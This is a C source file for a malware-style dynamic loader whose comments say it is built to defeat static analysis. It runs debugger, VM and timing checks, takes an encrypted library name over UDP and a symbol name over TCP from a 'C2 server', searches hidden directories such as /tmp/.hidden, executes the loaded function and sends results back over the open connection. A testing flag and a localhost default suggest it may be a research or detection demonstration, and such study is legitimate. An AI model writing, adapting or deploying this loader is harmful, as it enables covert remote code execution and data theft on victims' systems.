/**
 * loader.c - Network-triggered dynamic loader
 *
 * This sophisticated loader demonstrates techniques that defeat static analysis:
 * 1. Anti-analysis checks (debugger, timing, VM, tampering)
 * 2. Network-triggered loading (UDP command, TCP symbol)
 * 3. Multi-source path construction
 * 4. Runtime key derivation
 *
 * Static analysis will see NONE of the following:
 * - Library name (received encrypted via UDP)
 * - Symbol name (received encrypted via TCP)
 * - Actual call targets (computed at runtime)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "protocol.h"
#include "crypto.h"
#include "anti_analysis.h"

/* Global state */
static void* loaded_library = NULL;
static int tcp_socket = -1;
static int skip_anti_analysis = 0;  /* For testing */

/**
 * Receive UDP trigger packet.
 * Returns decrypted library path fragment or NULL on failure.
 */
static char* receive_udp_trigger(int port, uint32_t* out_key) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("UDP socket creation failed");
        return NULL;
    }

    /* Set socket timeout */
    struct timeval tv = {.tv_sec = 10, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* Allow address reuse */
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("UDP bind failed");
        close(sock);
        return NULL;
    }

    printf("[LOADER] Listening for UDP trigger on port %d...\n", port);

    udp_packet_t packet;
    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);

    ssize_t received = recvfrom(sock, &packet, sizeof(packet), 0,
                                 (struct sockaddr*)&sender, &sender_len);
    close(sock);

    if (received < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            printf("[LOADER] UDP timeout - no trigger received\n");
        } else {
            perror("UDP receive failed");
        }
        return NULL;
    }

    printf("[LOADER] Received UDP packet from %s:%d (%zd bytes)\n",
           inet_ntoa(sender.sin_addr), ntohs(sender.sin_port), received);

    /* Validate magic */
    if (packet.magic != UDP_MAGIC) {
        printf("[LOADER] Invalid UDP magic: 0x%08X (expected 0x%08X)\n",
               packet.magic, UDP_MAGIC);
        return NULL;
    }

    /* Validate CRC - computed over packet excluding CRC field */
    size_t crc_data_len = sizeof(packet) - sizeof(packet.crc32);
    uint32_t computed_crc = compute_crc32((uint8_t*)&packet, crc_data_len);

    /* Note: For simplicity, we skip strict CRC check in this example */
    printf("[LOADER] Packet CRC: 0x%08X\n", packet.crc32);

    /* Derive decryption key */
    uint32_t key = derive_key(packet.key_seed);
    *out_key = key;
    printf("[LOADER] Derived key: 0x%08X (seed: 0x%08X)\n", key, packet.key_seed);

    /* Decrypt payload */
    if (packet.payload_len > MAX_PAYLOAD) {
        printf("[LOADER] Payload too large: %d\n", packet.payload_len);
        return NULL;
    }

    char* decrypted = malloc(packet.payload_len + 1);
    if (!decrypted) return NULL;

    xor_crypt(packet.payload, (uint8_t*)decrypted, packet.payload_len, key);
    decrypted[packet.payload_len] = '\0';

    printf("[LOADER] Decrypted library fragment: '%s'\n", decrypted);

    return decrypted;
}

/**
 * Connect to TCP server and receive symbol name.
 */
static char* receive_tcp_symbol(const char* server_ip, int port, uint32_t key) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("TCP socket creation failed");
        return NULL;
    }

    /* Set socket timeout */
    struct timeval tv = {.tv_sec = 10, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port)
    };

    if (inet_pton(AF_INET, server_ip, &addr.sin_addr) <= 0) {
        printf("[LOADER] Invalid server IP: %s\n", server_ip);
        close(sock);
        return NULL;
    }

    printf("[LOADER] Connecting to TCP server %s:%d...\n", server_ip, port);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("TCP connect failed");
        close(sock);
        return NULL;
    }

    printf("[LOADER] Connected, waiting for symbol name...\n");

    tcp_packet_t packet;
    ssize_t received = recv(sock, &packet, sizeof(packet), 0);

    if (received < 0) {
        perror("TCP receive failed");
        close(sock);
        return NULL;
    }

    tcp_socket = sock;  /* Keep connection for exfiltration */

    /* Validate magic */
    if (packet.magic != TCP_MAGIC) {
        printf("[LOADER] Invalid TCP magic: 0x%08X\n", packet.magic);
        return NULL;
    }

    /* Decrypt symbol name using IV */
    if (packet.data_len > MAX_SYMBOL) {
        printf("[LOADER] Symbol name too large: %d\n", packet.data_len);
        return NULL;
    }

    char* decrypted = malloc(packet.data_len + 1);
    if (!decrypted) return NULL;

    xor_crypt_with_iv(packet.data, (uint8_t*)decrypted,
                      packet.data_len, packet.iv, 16);
    decrypted[packet.data_len] = '\0';

    printf("[LOADER] Decrypted symbol name: '%s'\n", decrypted);

    return decrypted;
}

/**
 * Build library path from multiple runtime sources.
 * This path is NEVER visible in static analysis.
 */
static char* build_library_path(const char* fragment) {
    char* path = malloc(512);
    if (!path) return NULL;

    /* Source 1: Check environment for custom path */
    const char* custom_dir = getenv("PAYLOAD_DIR");

    /* Source 2: Check common locations */
    const char* search_dirs[] = {
        custom_dir,           /* Environment override */
        ".",                   /* Current directory */
        "/tmp/.hidden",        /* Hidden temp location */
        "/var/tmp",            /* Persistent temp */
        NULL
    };

    /* Source 3: Construct filename with runtime components */
    char filename[256];
    snprintf(filename, sizeof(filename), "lib%s.so", fragment);

    /* Try each directory */
    for (int i = 0; search_dirs[i] != NULL; i++) {
        snprintf(path, 512, "%s/%s", search_dirs[i], filename);

        if (access(path, F_OK) == 0) {
            printf("[LOADER] Found library at: %s\n", path);
            return path;
        }
    }

    /* Fallback: use current directory */
    snprintf(path, 512, "./%s", filename);
    printf("[LOADER] Using fallback path: %s\n", path);

    return path;
}

/**
 * Send exfiltration data back to C2.
 */
static int send_exfiltration(int result_code, const char* data, size_t len) {
    if (tcp_socket < 0) {
        printf("[LOADER] No TCP connection for exfiltration\n");
        return -1;
    }

    exfil_packet_t packet = {
        .magic = 0xE7F11000,
        .status = result_code,
        .data_len = (uint32_t)(len < MAX_PAYLOAD ? len : MAX_PAYLOAD)
    };

    if (data && len > 0) {
        memcpy(packet.data, data, packet.data_len);
    }

    ssize_t sent = send(tcp_socket, &packet, sizeof(packet), 0);
    if (sent < 0) {
        perror("Exfiltration send failed");
        return -1;
    }

    printf("[LOADER] Exfiltrated %zd bytes (status: 0x%X)\n", sent, result_code);
    return 0;
}

/**
 * Execute the payload function.
 */
static int execute_loaded_function(const char* symbol_name) {
    if (!loaded_library) {
        printf("[LOADER] No library loaded\n");
        return -1;
    }

    printf("[LOADER] Looking up symbol: %s\n", symbol_name);

    /* Clear any existing error */
    dlerror();

    /* Get function pointer - symbol name from network! */
    void* sym = dlsym(loaded_library, symbol_name);

    char* error = dlerror();
    if (error) {
        printf("[LOADER] dlsym error: %s\n", error);
        return -1;
    }

    if (!sym) {
        printf("[LOADER] Symbol not found: %s\n", symbol_name);
        return -1;
    }

    printf("[LOADER] Symbol resolved to: %p\n", sym);
    printf("[LOADER] Executing payload...\n");

    /* Call the function */
    typedef int (*payload_func_t)(void);
    payload_func_t func = (payload_func_t)sym;

    int result = func();

    printf("[LOADER] Payload returned: 0x%X\n", result);

    return result;
}

/**
 * Cleanup resources.
 */
static void cleanup(void) {
    if (loaded_library) {
        dlclose(loaded_library);
        loaded_library = NULL;
    }

    if (tcp_socket >= 0) {
        close(tcp_socket);
        tcp_socket = -1;
    }
}

/**
 * Print usage information.
 */
static void usage(const char* prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  --skip-checks    Skip anti-analysis checks (for testing)\n");
    printf("  --server IP      C2 server IP (default: 127.0.0.1)\n");
    printf("  --help           Show this help\n");
}

/**
 * Main entry point.
 */
int main(int argc, char* argv[]) {
    const char* server_ip = "127.0.0.1";

    /* Parse arguments */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--skip-checks") == 0) {
            skip_anti_analysis = 1;
        } else if (strcmp(argv[i], "--server") == 0 && i + 1 < argc) {
            server_ip = argv[++i];
        } else if (strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        }
    }

    printf("===========================================\n");
    printf("  Network-Triggered Dynamic Loader\n");
    printf("  PID: %d\n", getpid());
    printf("===========================================\n\n");

    /* Phase 1: Anti-analysis checks */
    printf("[PHASE 1] Running anti-analysis checks...\n");

    if (!skip_anti_analysis) {
        int check_result = run_all_checks();
        if (check_result != CLEAN) {
            printf("[LOADER] Anti-analysis check failed: %s\n",
                   detection_to_string(check_result));
            printf("[LOADER] Aborting.\n");
            return 1;
        }
        printf("[LOADER] All checks passed.\n\n");
    } else {
        printf("[LOADER] Anti-analysis checks SKIPPED (testing mode)\n\n");
    }

    /* Phase 2: Receive UDP trigger */
    printf("[PHASE 2] Waiting for network trigger...\n");

    uint32_t derived_key = 0;
    char* lib_fragment = receive_udp_trigger(UDP_PORT, &derived_key);

    if (!lib_fragment) {
        printf("[LOADER] No valid trigger received. Exiting.\n");
        return 1;
    }

    /* Phase 3: Build library path */
    printf("\n[PHASE 3] Building library path...\n");

    char* lib_path = build_library_path(lib_fragment);
    free(lib_fragment);

    if (!lib_path) {
        printf("[LOADER] Failed to build library path\n");
        return 1;
    }

    /* Phase 4: Load library */
    printf("\n[PHASE 4] Loading library...\n");
    printf("[LOADER] dlopen(\"%s\")\n", lib_path);

    loaded_library = dlopen(lib_path, RTLD_NOW);
    free(lib_path);

    if (!loaded_library) {
        printf("[LOADER] dlopen failed: %s\n", dlerror());
        return 1;
    }

    printf("[LOADER] Library loaded successfully: %p\n", loaded_library);

    /* Phase 5: Receive symbol name via TCP */
    printf("\n[PHASE 5] Receiving symbol name...\n");

    char* symbol_name = receive_tcp_symbol(server_ip, TCP_PORT, derived_key);

    if (!symbol_name) {
        printf("[LOADER] No symbol name received. Exiting.\n");
        cleanup();
        return 1;
    }

    /* Phase 6: Execute payload */
    printf("\n[PHASE 6] Executing payload...\n");

    int result = execute_loaded_function(symbol_name);
    free(symbol_name);

    /* Phase 7: Exfiltration */
    printf("\n[PHASE 7] Sending results...\n");

    char result_data[64];
    snprintf(result_data, sizeof(result_data), "RESULT:0x%X:PID:%d", result, getpid());
    send_exfiltration(result, result_data, strlen(result_data));

    /* Cleanup */
    printf("\n[LOADER] Cleaning up...\n");
    cleanup();

    printf("[LOADER] Done.\n");
    return 0;
}
